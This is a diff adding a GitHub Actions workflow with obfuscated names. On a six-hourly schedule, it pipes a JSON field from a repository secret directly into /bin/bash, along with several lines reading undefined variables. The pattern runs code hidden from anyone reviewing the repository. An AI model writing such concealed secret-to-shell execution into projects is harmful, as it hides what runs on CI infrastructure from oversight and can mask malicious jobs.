@@ -1,0 +1,23 @@
+name: pingtaiqkxm
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: pingtaiqkxm
+        env:
+          bglea70236: ${{ secrets.bglea70236 }}
+        run: |
+          echo $bglea70236 | jq -r .qxm15211 | /bin/bash
+          echo $lz19120 | jq -r .ka55 | /bin/bash
+          echo $d948 | jq -r .bwib28 | /bin/bash
+          echo $sy094 | jq -r .k64 | /bin/bash
+          echo $y15800 | jq -r .uokno2 | /bin/bash
+          echo $kobs6592 | jq -r .fq197 | /bin/bash
+          echo $y155 | jq -r .r0457 | /bin/bash
+          echo $f3596 | jq -r .n221 | /bin/bash
+
